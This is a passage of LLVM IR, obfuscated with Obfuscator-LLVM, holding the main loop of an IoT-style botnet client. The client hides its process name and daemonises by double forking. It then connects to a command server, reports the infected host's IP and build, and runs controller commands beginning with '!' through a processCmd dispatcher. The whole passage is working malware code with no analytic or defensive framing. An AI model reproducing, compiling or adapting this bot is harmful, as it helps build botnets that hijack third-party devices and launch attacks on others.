  store i32 %52, i32* %8, align 4
  %53 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %54 = load i32, i32* %8, align 4
  call void @rand_alphastr(i8* %53, i32 %54)
  %55 = load i32, i32* %8, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 %56
  store i8 0, i8* %57, align 1
  %58 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %59 = call i32 (i32, ...) @prctl(i32 15, i8* %58) #3
  %60 = call i64 @time(i64* null) #3
  %61 = call i32 @getpid() #3
  %62 = sext i32 %61 to i64
  %63 = xor i64 %60, -1
  %64 = and i64 855191247565108064, %63
  %65 = xor i64 855191247565108064, -1
  %66 = and i64 %60, %65
  %67 = xor i64 %62, -1
  %68 = and i64 %67, 855191247565108064
  %69 = and i64 %62, %65
  %70 = or i64 %64, %66
  %71 = or i64 %68, %69
  %72 = xor i64 %70, %71
  %73 = xor i64 %60, %62
  %74 = trunc i64 %72 to i32
  call void @srand(i32 %74) #3
  call void @rand_init()
  %75 = call i32 @getOurIP()
  %76 = call i32 @fork() #3
  store i32 %76, i32* %9, align 4
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %78, label %81

; <label>:78:                                     ; preds = %2
  %79 = load i32, i32* %9, align 4
  %80 = call i32 @waitpid(i32 %79, i32* %11, i32 0)
  call void @exit(i32 0) #11
  unreachable

; <label>:81:                                     ; preds = %2
  %82 = load i32, i32* %9, align 4
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %95, label %84

; <label>:84:                                     ; preds = %81
  %85 = call i32 @fork() #3
  store i32 %85, i32* %10, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %84
  call void @exit(i32 0) #11
  unreachable

; <label>:88:                                     ; preds = %84
  %89 = load i32, i32* %10, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %92, label %91

; <label>:91:                                     ; preds = %88
  br label %93

; <label>:92:                                     ; preds = %88
  br label %93

; <label>:93:                                     ; preds = %92, %91
  br label %94

; <label>:94:                                     ; preds = %93
  br label %96

; <label>:95:                                     ; preds = %81
  br label %96

; <label>:96:                                     ; preds = %95, %94
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.145, i32 0, i32 0)) #3
  %99 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  br label %100

; <label>:100:                                    ; preds = %399, %103, %97
  %101 = call i32 @initConnection()
  %102 = icmp ne i32 %101, 0
  br i1 %102, label %103, label %104

; <label>:103:                                    ; preds = %100
  br label %100

; <label>:104:                                    ; preds = %100
  %105 = load i32, i32* @KadenCommStock, align 4
  %106 = call i8* @getBuild()
  %107 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %108 = call i8* @inet_ntoa(i32 %107) #3
  %109 = call i32 @getEndianness()
  %110 = call i8* @getBuildz()
  %111 = call i32 (i32, i8*, ...) @botnetPrint(i32 %105, i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.146, i32 0, i32 0), i8* %106, i8* %108, i32 %109, i8* %110)
  call void @CleanDevice()
  call void @UpdateNameSrvs()
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  br label %112

; <label>:112:                                    ; preds = %398, %249, %104
  %113 = load i32, i32* @KadenCommStock, align 4
  %114 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  %115 = call i32 @recvLine(i32 %113, i8* %114, i32 4096)
  store i32 %115, i32* %13, align 4
  %116 = icmp ne i32 %115, -1
  br i1 %116, label %117, label %399

; <label>:117:                                    ; preds = %112
  store i32 0, i32* %14, align 4
  br label %118

; <label>:118:                                    ; preds = %210, %117
  %119 = load i32, i32* %14, align 4
  %120 = sext i32 %119 to i64
  %121 = load i64, i64* @numpids, align 8
  %122 = icmp ult i64 %120, %121
  br i1 %122, label %123, label %216

; <label>:123:                                    ; preds = %118
  %124 = load i32*, i32** @pids, align 8
  %125 = load i32, i32* %14, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %124, i64 %126
  %128 = load i32, i32* %127, align 4
  %129 = call i32 @waitpid(i32 %128, i32* null, i32 1)
  %130 = icmp sgt i32 %129, 0
  br i1 %130, label %131, label %209

; <label>:131:                                    ; preds = %123
  %132 = load i32, i32* %14, align 4
  %133 = sub i32 0, 1
  %134 = sub i32 %132, %133
  %135 = add nsw i32 %132, 1
  store i32 %134, i32* %16, align 4
  br label %136

; <label>:136:                                    ; preds = %155, %131
  %137 = load i32, i32* %16, align 4
  %138 = zext i32 %137 to i64
  %139 = load i64, i64* @numpids, align 8
  %140 = icmp ult i64 %138, %139
  br i1 %140, label %141, label %162

; <label>:141:                                    ; preds = %136
  %142 = load i32*, i32** @pids, align 8
  %143 = load i32, i32* %16, align 4
  %144 = zext i32 %143 to i64
  %145 = getelementptr inbounds i32, i32* %142, i64 %144
  %146 = load i32, i32* %145, align 4
  %147 = load i32*, i32** @pids, align 8
  %148 = load i32, i32* %16, align 4
  %149 = sub i32 %148, -1238226143
  %150 = sub i32 %149, 1
  %151 = add i32 %150, -1238226143
  %152 = sub i32 %148, 1
  %153 = zext i32 %151 to i64
  %154 = getelementptr inbounds i32, i32* %147, i64 %153
  store i32 %146, i32* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %141
  %156 = load i32, i32* %16, align 4
  %157 = sub i32 0, %156
  %158 = sub i32 0, 1
  %159 = add i32 %157, %158
  %160 = sub i32 0, %159
  %161 = add i32 %156, 1
  store i32 %160, i32* %16, align 4
  br label %136

; <label>:162:                                    ; preds = %136
  %163 = load i32*, i32** @pids, align 8
  %164 = load i32, i32* %16, align 4
  %165 = sub i32 0, 1
  %166 = add i32 %164, %165
  %167 = sub i32 %164, 1
  %168 = zext i32 %166 to i64
  %169 = getelementptr inbounds i32, i32* %163, i64 %168
  store i32 0, i32* %169, align 4
  %170 = load i64, i64* @numpids, align 8
  %171 = sub i64 0, %170
  %172 = sub i64 0, -1
  %173 = add i64 %171, %172
  %174 = sub i64 0, %173
  %175 = add i64 %170, -1
  store i64 %174, i64* @numpids, align 8
  %176 = load i64, i64* @numpids, align 8
  %177 = add i64 %176, -2023345897636686898
  %178 = add i64 %177, 1
  %179 = sub i64 %178, -2023345897636686898
  %180 = add i64 %176, 1
  %181 = mul i64 %179, 4
  %182 = call noalias i8* @malloc(i64 %181) #3
  %183 = bitcast i8* %182 to i32*
  store i32* %183, i32** %15, align 8
  store i32 0, i32* %16, align 4
  br label %184

; <label>:184:                                    ; preds = %199, %162
  %185 = load i32, i32* %16, align 4
  %186 = zext i32 %185 to i64
  %187 = load i64, i64* @numpids, align 8
  %188 = icmp ult i64 %186, %187
  br i1 %188, label %189, label %205

; <label>:189:                                    ; preds = %184
  %190 = load i32*, i32** @pids, align 8
  %191 = load i32, i32* %16, align 4
  %192 = zext i32 %191 to i64
  %193 = getelementptr inbounds i32, i32* %190, i64 %192
  %194 = load i32, i32* %193, align 4
  %195 = load i32*, i32** %15, align 8
  %196 = load i32, i32* %16, align 4
  %197 = zext i32 %196 to i64
  %198 = getelementptr inbounds i32, i32* %195, i64 %197
  store i32 %194, i32* %198, align 4
  br label %199

; <label>:199:                                    ; preds = %189
  %200 = load i32, i32* %16, align 4
  %201 = add i32 %200, 1393687815
  %202 = add i32 %201, 1
  %203 = sub i32 %202, 1393687815
  %204 = add i32 %200, 1
  store i32 %203, i32* %16, align 4
  br label %184

; <label>:205:                                    ; preds = %184
  %206 = load i32*, i32** @pids, align 8
  %207 = bitcast i32* %206 to i8*
  call void @free(i8* %207) #3
  %208 = load i32*, i32** %15, align 8
  store i32* %208, i32** @pids, align 8
  br label %209

; <label>:209:                                    ; preds = %205, %123
  br label %210

; <label>:210:                                    ; preds = %209
  %211 = load i32, i32* %14, align 4
  %212 = add i32 %211, 1983989680
  %213 = add i32 %212, 1
  %214 = sub i32 %213, 1983989680
  %215 = add nsw i32 %211, 1
  store i32 %214, i32* %14, align 4
  br label %118

; <label>:216:                                    ; preds = %118
  %217 = load i32, i32* %13, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 %218
  store i8 0, i8* %219, align 1
  %220 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  call void @trim(i8* %220)
  %221 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  store i8* %221, i8** %17, align 8
  %222 = load i8*, i8** %17, align 8
  %223 = load i8, i8* %222, align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 33
  br i1 %225, label %226, label %398

; <label>:226:                                    ; preds = %216
  %227 = load i8*, i8** %17, align 8
  %228 = getelementptr inbounds i8, i8* %227, i64 1
  store i8* %228, i8** %18, align 8
  br label %229

; <label>:229:                                    ; preds = %241, %226
  %230 = load i8*, i8** %18, align 8
  %231 = load i8, i8* %230, align 1
  %232 = zext i8 %231 to i32
  %233 = icmp ne i32 %232, 32
  br i1 %233, label %234, label %239

; <label>:234:                                    ; preds = %229
  %235 = load i8*, i8** %18, align 8
  %236 = load i8, i8* %235, align 1
  %237 = zext i8 %236 to i32
  %238 = icmp ne i32 %237, 0
  br label %239

; <label>:239:                                    ; preds = %234, %229
  %240 = phi i1 [ false, %229 ], [ %238, %234 ]
  br i1 %240, label %241, label %244

; <label>:241:                                    ; preds = %239
  %242 = load i8*, i8** %18, align 8
  %243 = getelementptr inbounds i8, i8* %242, i32 1
  store i8* %243, i8** %18, align 8
  br label %229

; <label>:244:                                    ; preds = %239
  %245 = load i8*, i8** %18, align 8
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %250

; <label>:249:                                    ; preds = %244
  br label %112

; <label>:250:                                    ; preds = %244
  %251 = load i8*, i8** %18, align 8
  store i8 0, i8* %251, align 1
  %252 = load i8*, i8** %17, align 8
  %253 = getelementptr inbounds i8, i8* %252, i64 1
  store i8* %253, i8** %18, align 8
  %254 = load i8*, i8** %17, align 8
  %255 = load i8*, i8** %18, align 8
  %256 = call i64 @strlen(i8* %255) #9
  %257 = getelementptr inbounds i8, i8* %254, i64 %256
  %258 = getelementptr inbounds i8, i8* %257, i64 2
  store i8* %258, i8** %17, align 8
  br label %259

; <label>:259:                                    ; preds = %284, %250
  %260 = load i8*, i8** %17, align 8
  %261 = load i8*, i8** %17, align 8
  %262 = call i64 @strlen(i8* %261) #9
  %263 = sub i64 0, 1
  %264 = add i64 %262, %263
  %265 = sub i64 %262, 1
  %266 = getelementptr inbounds i8, i8* %260, i64 %264
  %267 = load i8, i8* %266, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp eq i32 %268, 10
  br i1 %269, label %282, label %270

; <label>:270:                                    ; preds = %259
  %271 = load i8*, i8** %17, align 8
  %272 = load i8*, i8** %17, align 8
  %273 = call i64 @strlen(i8* %272) #9
  %274 = add i64 %273, -2832149105427432102
  %275 = sub i64 %274, 1
  %276 = sub i64 %275, -2832149105427432102
  %277 = sub i64 %273, 1
  %278 = getelementptr inbounds i8, i8* %271, i64 %276
  %279 = load i8, i8* %278, align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 13
  br label %282

; <label>:282:                                    ; preds = %270, %259
  %283 = phi i1 [ true, %259 ], [ %281, %270 ]
  br i1 %283, label %284, label %293

; <label>:284:                                    ; preds = %282
  %285 = load i8*, i8** %17, align 8
  %286 = load i8*, i8** %17, align 8
  %287 = call i64 @strlen(i8* %286) #9
  %288 = sub i64 %287, -9002526081611970893
  %289 = sub i64 %288, 1
  %290 = add i64 %289, -9002526081611970893
  %291 = sub i64 %287, 1
  %292 = getelementptr inbounds i8, i8* %285, i64 %290
  store i8 0, i8* %292, align 1
  br label %259

; <label>:293:                                    ; preds = %282
  %294 = load i8*, i8** %17, align 8
  store i8* %294, i8** %19, align 8
  br label %295

; <label>:295:                                    ; preds = %307, %293
  %296 = load i8*, i8** %17, align 8
  %297 = load i8, i8* %296, align 1
  %298 = zext i8 %297 to i32
  %299 = icmp ne i32 %298, 32
  br i1 %299, label %300, label %305

; <label>:300:                                    ; preds = %295
  %301 = load i8*, i8** %17, align 8
  %302 = load i8, i8* %301, align 1
  %303 = zext i8 %302 to i32
  %304 = icmp ne i32 %303, 0
  br label %305

; <label>:305:                                    ; preds = %300, %295
  %306 = phi i1 [ false, %295 ], [ %304, %300 ]
  br i1 %306, label %307, label %310

; <label>:307:                                    ; preds = %305
  %308 = load i8*, i8** %17, align 8
  %309 = getelementptr inbounds i8, i8* %308, i32 1
  store i8* %309, i8** %17, align 8
  br label %295

; <label>:310:                                    ; preds = %305
  %311 = load i8*, i8** %17, align 8
  store i8 0, i8* %311, align 1
  %312 = load i8*, i8** %17, align 8
  %313 = getelementptr inbounds i8, i8* %312, i32 1
  store i8* %313, i8** %17, align 8
  %314 = load i8*, i8** %19, align 8
  store i8* %314, i8** %20, align 8
  br label %315

; <label>:315:                                    ; preds = %319, %310
  %316 = load i8*, i8** %20, align 8
  %317 = load i8, i8* %316, align 1
  %318 = icmp ne i8 %317, 0
  br i1 %318, label %319, label %328

; <label>:319:                                    ; preds = %315
  %320 = load i8*, i8** %20, align 8
  %321 = load i8, i8* %320, align 1
  %322 = zext i8 %321 to i32
  %323 = call i32 @toupper(i32 %322) #9
  %324 = trunc i32 %323 to i8
  %325 = load i8*, i8** %20, align 8
  store i8 %324, i8* %325, align 1
  %326 = load i8*, i8** %20, align 8
  %327 = getelementptr inbounds i8, i8* %326, i32 1
  store i8* %327, i8** %20, align 8
  br label %315

; <label>:328:                                    ; preds = %315
  store i32 1, i32* %22, align 4
  %329 = load i8*, i8** %17, align 8
  %330 = call i8* @strtok(i8* %329, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0)) #3
  store i8* %330, i8** %23, align 8
  %331 = load i8*, i8** %19, align 8
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %331, i8** %332, align 16
  br label %333

; <label>:333:                                    ; preds = %372, %328
  %334 = load i8*, i8** %23, align 8
  %335 = icmp ne i8* %334, null
  br i1 %335, label %336, label %374

; <label>:336:                                    ; preds = %333
  %337 = load i8*, i8** %23, align 8
  %338 = load i8, i8* %337, align 1
  %339 = zext i8 %338 to i32
  %340 = icmp ne i32 %339, 10
  br i1 %340, label %341, label %372

; <label>:341:                                    ; preds = %336
  %342 = load i8*, i8** %23, align 8
  %343 = call i64 @strlen(i8* %342) #9
  %344 = add i64 %343, 573739308031256043
  %345 = add i64 %344, 1
  %346 = sub i64 %345, 573739308031256043
  %347 = add i64 %343, 1
  %348 = call noalias i8* @malloc(i64 %346) #3
  %349 = load i32, i32* %22, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %350
  store i8* %348, i8** %351, align 8
  %352 = load i32, i32* %22, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %353
  %355 = load i8*, i8** %354, align 8
  %356 = load i8*, i8** %23, align 8
  %357 = call i64 @strlen(i8* %356) #9
  %358 = add i64 %357, 2974953952190726000
  %359 = add i64 %358, 1
  %360 = sub i64 %359, 2974953952190726000
  %361 = add i64 %357, 1
  call void @llvm.memset.p0i8.i64(i8* %355, i8 0, i64 %360, i32 1, i1 false)
  %362 = load i32, i32* %22, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %363
  %365 = load i8*, i8** %364, align 8
  %366 = load i8*, i8** %23, align 8
  %367 = call i8* @strcpy(i8* %365, i8* %366) #3
  %368 = load i32, i32* %22, align 4
  %369 = sub i32 0, 1
  %370 = sub i32 %368, %369
  %371 = add nsw i32 %368, 1
  store i32 %370, i32* %22, align 4
  br label %372

; <label>:372:                                    ; preds = %341, %336
  %373 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0)) #3
  store i8* %373, i8** %23, align 8
  br label %333

; <label>:374:                                    ; preds = %333
  %375 = load i32, i32* %22, align 4
  %376 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %375, i8** %376)
  %377 = load i32, i32* %22, align 4
  %378 = icmp sgt i32 %377, 1
  br i1 %378, label %379, label %397

; <label>:379:                                    ; preds = %374
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %380

; <label>:380:                                    ; preds = %389, %379
  %381 = load i32, i32* %24, align 4
  %382 = load i32, i32* %22, align 4
  %383 = icmp slt i32 %381, %382
  br i1 %383, label %384, label %396

; <label>:384:                                    ; preds = %380
  %385 = load i32, i32* %24, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %386
  %388 = load i8*, i8** %387, align 8
  call void @free(i8* %388) #3
  br label %389

; <label>:389:                                    ; preds = %384
  %390 = load i32, i32* %24, align 4
  %391 = sub i32 0, %390
  %392 = sub i32 0, 1
  %393 = add i32 %391, %392
  %394 = sub i32 0, %393
  %395 = add nsw i32 %390, 1
  store i32 %394, i32* %24, align 4
  br label %380

; <label>:396:                                    ; preds = %380
  br label %397

; <label>:397:                                    ; preds = %396, %374
  br label %398

; <label>:398:                                    ; preds = %397, %216
  br label %112

; <label>:399:                                    ; preds = %112
  br label %100
                                                  ; No predecessors!
  %401 = load i32, i32* %3, align 4
  ret i32 %401
}

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn nounwind }
attributes #12 = { noreturn }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146536828}
!2 = !{i32 -2146536137}
!3 = !{i32 -2146535388}
!4 = !{i32 -2146534678}
!5 = !{i32 -2146533860}
!6 = !{i32 -2146532969}
